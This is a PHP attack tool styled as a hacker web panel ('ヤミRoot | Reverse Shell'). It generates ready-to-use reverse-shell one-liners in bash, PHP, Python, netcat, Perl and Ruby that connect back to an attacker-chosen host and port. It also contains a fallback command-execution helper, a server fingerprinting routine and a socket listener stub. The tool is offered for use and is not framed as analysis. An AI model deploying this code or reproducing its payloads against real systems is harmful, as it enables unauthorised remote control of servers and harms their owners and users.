<?php

session_start();

@error_reporting(0);

@set_time_limit(0);

ini_set('memory_limit', '256M');

header('Content-Type: text/html; charset=UTF-8');

ob_end_clean();


$title = "ヤミRoot | Reverse Shell";

$author = "0x6ick";

$bg = "#0a0a0f";

$fg = "#E0FF00";

$pink = "#FF00C8";

$cyan = "#00FFF7";

$purple = "#7D00FF";

$input_bg = "#120024";

$input_fg = "#00FFB2";

$font = "'Fira Code', monospace";


function x($c) {

    $o = '';

    if (function_exists('exec')) {

        @exec($c . ' 2>&1', $a);

        return implode("\n", $a);

    } elseif (function_exists('shell_exec')) {

        $o = @shell_exec($c . ' 2>&1');

        return $o ?: "shell_exec output empty";

    } elseif (function_exists('system')) {

        ob_start();

        @system($c . ' 2>&1');

        return ob_get_clean();

    } elseif (function_exists('passthru')) {

        ob_start();

        @passthru($c . ' 2>&1');

        return ob_get_clean();

    } elseif (is_resource($f = @popen($c, "r"))) {

        $o = "";

        while (!@feof($f)) $o .= @fread($f, 1024);

        @pclose($f);

        return $o;

    }

    return "All execution functions disabled.";

}

// i() replaces getServerInfo()

function i() {

    $s['u'] = $_SERVER['REMOTE_ADDR'] ?? 'N/A';

    $s['h'] = $_SERVER['HTTP_HOST'] ?? 'N/A';

    $s['n'] = $_SERVER['SERVER_NAME'] ?? 'N/A';

    $s['o'] = php_uname() ?? 'N/A';

    $s['p'] = PHP_VERSION ?? 'N/A';

    return $s;

}

// --- REVERSE SHELL GENERATOR LOGIC ---

function generatePayload($ip, $port, $type) {

    $ip_esc = htmlspecialchars($ip);

    $port_esc = htmlspecialchars($port);

    $payloads = [

        'bash' => "bash -i >& /dev/tcp/{$ip_esc}/{$port_esc} 0>&1",

        'php' => "php -r '\$sock=fsockopen(\"{$ip_esc}\",{$port_esc});exec(\"/bin/sh <&3 >&3 2>&3\");'",

        'python' => "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$ip_esc}\",{$port_esc}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",

        'nc' => "nc -e /bin/sh {$ip_esc} {$port_esc}",

        'perl' => "perl -e 'use Socket; \$i=\"{$ip_esc}\"; \$p={$port_esc}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in(\$p,inet_aton(\$i))); open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/bash\");'",

        'ruby' => "ruby -rsocket -e'f=TCPSocket.open(\"{$ip_esc}\",{$port_esc}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

    ];

    return $payloads[$type] ?? "Payload type not recognized.";

}

// --- SIMPLE LISTENER LOGIC (Experimental) ---

function startListener($port) {

    if (!function_exists('socket_create')) {

        return "PHP Socket extension is not enabled. Cannot run PHP Listener.";

    }

    

    $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    if ($sock === false) {

        return "Socket creation failed. Error: " . socket_strerror(socket_last_error());

    }

    @socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);

    

    if (@socket_bind($sock, '0.0.0.0', $port) === false) {

        @socket_close($sock);

        return "Port {$port} is busy or permissions denied (typical on shared hosting).";

    }

    if (@socket_listen($sock, 5) === false) {

        @socket_close($sock);

        return "Socket listen failed. Check firewall/permissions.";

    }

    

    return "PHP Listener started on port {$port} (0.0.0.0). **WARNING: This connection will likely time out quickly or fail on shared hosting. Use netcat/ncat on your local machine for reliability.**";

}

// --- FORM INPUT PROCESSING ---

$action = $_GET['action'] ?? 'generator';

$output = '';

$server_info = i(); // Call obfuscated function i()

if (isset($_POST['do_tool'])) {

    $LHOST = $_POST['lhost'] ?? '127.0.0.1';

    $LPORT = $_POST['lport'] ?? '4444';

    $SHELL_TYPE = $_POST['shell_type'] ?? 'bash';

    if ($action == 'generator') {

        $output = generatePayload($LHOST, $LPORT, $SHELL_TYPE);

    } elseif ($action == 'listener') {

        $output = startListener($LPORT);

    }

}

?>

<!DOCTYPE HTML>

<html>

<head>

<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">

<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">

<title><?php echo htmlspecialchars($title); ?></title>

<style>

/* Fira Code is used */

*{box-sizing:border-box;margin:0;padding:0;font-family:<?php echo $font; ?>} 

body{background:<?php echo $bg; ?>;color:<?php echo $fg; ?>;min-height:100vh;padding:20px;background-image:repeating-linear-gradient(0deg,transparent,transparent 2px,#11111a 2px,#11111a 4px)}

.container{max-width:1200px;margin:0 auto}

.glitch{text-align:center;font-size:30px;color:white;margin:10px 0 20px;position:relative;text-transform:uppercase;letter-spacing:3px}

.glitch:before,.glitch:after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;height:100%}

.glitch:before{left:2px;text-shadow:-2px 0 <?php echo $pink; ?>;clip:rect(44px,450px,56px,0);animation:ga 5s infinite linear alternate-reverse}

.glitch:after{left:-2px;text-shadow:-2px 0 <?php echo $cyan; ?>;clip:rect(44px,450px,56px,0);animation:ga 3s infinite linear alternate-reverse}

@keyframes ga{0%{clip:rect(32px,9999px,28px,0)}5%{clip:rect(13px,9999px,37px,0)}10%{clip:rect(40px,9999px,39px,0)}15%{clip:rect(14px,9999px,62px,0)}20%{clip:rect(63px,9999px,14px,0)}25%{clip:rect(43px,9999px,28px,0)}30%{clip:rect(24px,9999px,78px,0)}35%{clip:rect(52px,9999px,56px,0)}40%{clip:rect(79px,9999px,89px,0)}45%{clip:rect(60px,9999px,69px,0)}50%{clip:rect(38px,9999px,29px,0)}55%{clip:rect(26px,9999px,54px,0)}60%{clip:rect(42px,9999px,90px,0)}65%{clip:rect(15px,9999px,85px,0)}70%{clip:rect(48px,9999px,61px,0)}75%{clip:rect(73px,9999px,74px,0)}80%{clip:rect(8px,9999px,13px,0)}85%{clip:rect(76px,9999px,48px,0)}90%{clip:rect(19px,9999px,59px,0)}95%{clip:rect(26px,9999px,80px,0)}100%{clip:rect(59px,9999px,30px,0)}}

.menu{display:flex;flex-wrap:wrap;justify-content:center;gap:5px;margin:20px 0;padding:15px;background:#11111a;border:2px solid <?php echo $purple; ?>;border-radius:8px;box-shadow:0 0 15px rgba(125,0,255,0.6)}

.menu a{padding:10px 15px;color:<?php echo $cyan; ?>;text-decoration:none;border-radius:4px;transition:all 0.3s}

.menu a:hover{color:<?php echo $pink; ?>;background:rgba(255,0,200,0.1);transform:translateY(-2px)}

.menu a.active{background:<?php echo $cyan; ?>;color:<?php echo $bg; ?>;font-weight:bold;box-shadow:0 0 10px <?php echo $cyan; ?>}

.box{background:#11111a;margin:25px 0;padding:25px;border:2px solid <?php echo $purple; ?>;border-radius:12px;box-shadow:0 0 20px rgba(125,0,255,0.8)}

.header{color:<?php echo $pink; ?>;text-align:center;font-size:1.8em;margin-bottom:25px;text-transform:uppercase;letter-spacing:2px;border-bottom:2px solid <?php echo $purple; ?>;padding-bottom:15px}

.form-group{margin-bottom:20px}

.form-group label{display:block;margin-bottom:8px;font-size:0.95em;font-weight:bold;text-transform:uppercase;letter-spacing:1px}

input[type="text"],select{width:100%;padding:12px;background:<?php echo $input_bg; ?>;color:<?php echo $input_fg; ?>;border:2px solid <?php echo $purple; ?>;border-radius:4px;font-size:1em;transition:all 0.3s}

input[type="text"]:focus,select:focus{border-color:<?php echo $cyan; ?>;box-shadow:0 0 15px <?php echo $cyan; ?>;outline:none}

input[type="submit"]{width:100%;padding:14px;background:linear-gradient(45deg,<?php echo $pink; ?>,<?php echo $purple; ?>);color:#000;font-weight:bold;border:none;border-radius:4px;cursor:pointer;transition:all 0.3s;font-size:1.1em;text-transform:uppercase;letter-spacing:2px;box-shadow:0 0 15px rgba(255,0,200,0.7)}

input[type="submit"]:hover{background:linear-gradient(45deg,<?php echo $cyan; ?>,<?php echo $pink; ?>);box-shadow:0 0 25px <?php echo $cyan; ?>;transform:translateY(-3px)}

pre{background:#000;border:2px solid <?php echo $input_fg; ?>;padding:20px;overflow-x:auto;white-space:pre-wrap;color:<?php echo $input_fg; ?>;border-radius:5px;margin-top:25px;box-shadow:0 0 15px rgba(0,255,178,0.4)}

.footer{text-align:center;padding:20px;font-size:0.9em;color:<?php echo $fg; ?>}

/* NEW CSS FOR INFO BOX */

.info-box {

    background: #11111a;

    border: 2px solid <?php echo $purple; ?>;

    border-radius: 8px;

    padding: 15px;

    margin-bottom: 25px;

    box-shadow: 0 0 10px rgba(125,0,255,0.4);

    font-size: 0.95em;

    line-height: 1.6;

}

.info-box table {

    width: 100%;

    border-collapse: collapse;

}

.info-box td {

    padding: 3px 0;

}

.info-box i {

    color: <?php echo $cyan; ?>;

    margin-right: 8px;

}

.info-box .label {

    color: white; 

    font-weight: 700;

    width: 30%;

}

.info-box .value {

    color: <?php echo $fg; ?>;

}

.payload-box {

    background: #000;

    border: 2px solid <?php echo $input_fg; ?>;

    padding: 15px;

    overflow-x: auto;

    white-space: pre-wrap;

    color: <?php echo $input_fg; ?>;

    border-radius: 5px;

    margin-top: 15px;

    box-shadow: 0 0 10px rgba(0,255,178,0.3);

    user-select: all; /* Allows easy copying */

}

@media(max-width:768px){.menu{flex-direction:column}.menu a{margin:3px 0}}

</style>

</head>

<body>

<div class="container">

<h1 class="glitch" data-text="<?php echo htmlspecialchars($title); ?>"><?php echo htmlspecialchars($title); ?></h1>

<div class="info-box">

    <table>

        <tr>

            <td class="label"><i class="fas fa-user"></i> User / IP</td>

            <td class="value">: <?php echo htmlspecialchars($server_info['u']); ?></td>

        </tr>

        <tr>

            <td class="label"><i class="fas fa-desktop"></i> Host / Server</td>

            <td class="value">: <?php echo htmlspecialchars($server_info['h']) . " / " . htmlspecialchars($server_info['n']); ?></td>

        </tr>

        <tr>

            <td class="label"><i class="fas fa-microchip"></i> System / PHP</td>

            <td class="value">: <?php echo htmlspecialchars($server_info['o']) . " / v" . htmlspecialchars($server_info['p']); ?></td>

        </tr>

    </table>

</div>

<div class="menu">

    <a href="?action=generator" class="<?php echo $action == 'generator' ? 'active' : ''; ?>"><i class="fas fa-code"></i> Payload Generator</a>

    <a href="?action=listener" class="<?php echo $action == 'listener' ? 'active' : ''; ?>"><i class="fas fa-satellite-dish"></i> Simple Listener</a>

</div>

<div class="box">

<div class="header"><i class="fas fa-share-square"></i> <?php echo ucwords($action); ?></div>

<?php if ($action == 'generator'): ?>

<form method="POST"><div class="form-group">

<label>LHOST (Your IP)</label>

<input type="text" name="lhost" placeholder="<?php echo $server_info['u'] ?? '10.0.0.1'; ?>" value="<?php echo $_POST['lhost'] ?? ($server_info['u'] ?? ''); ?>" required>

</div><div class="form-group">

<label>LPORT (Port to Listen)</label>

<input type="text" name="lport" placeholder="4444" value="<?php echo $_POST['lport'] ?? '4444'; ?>" required>

</div><div class="form-group">

<label>Shell Type</label>

<select name="shell_type">

<option value="bash">Bash</option>

<option value="php">PHP</option>

<option value="python">Python</option>

<option value="nc">Netcat (nc)</option>

<option value="perl">Perl</option>

<option value="ruby">Ruby</option>

</select>

</div><input type="submit" name="do_tool" value="GENERATE PAYLOAD"></form>

<?php elseif ($action == 'listener'): ?>

<form method="POST"><div class="form-group">

<label>LPORT (Port to Listen)</label>

<input type="text" name="lport" placeholder="4444" value="<?php echo $_POST['lport'] ?? '4444'; ?>" required>

</div><input type="submit" name="do_tool" value="START LISTENER"></form>

<?php endif; ?>

<?php if(!empty($output)): ?>

<h4 style="color:<?php echo $cyan;?>;margin-top:25px;text-align:left;">Output:</h4>

<div class="payload-box">

    <?php echo htmlspecialchars($output); ?>

</div>

<?php endif; ?>

</div>

<div class="footer">Coded With &#x1f497; by <span style="color:<?php echo $purple;?>"><?php echo htmlspecialchars($author); ?></span></div>

</div>

</body>

</html>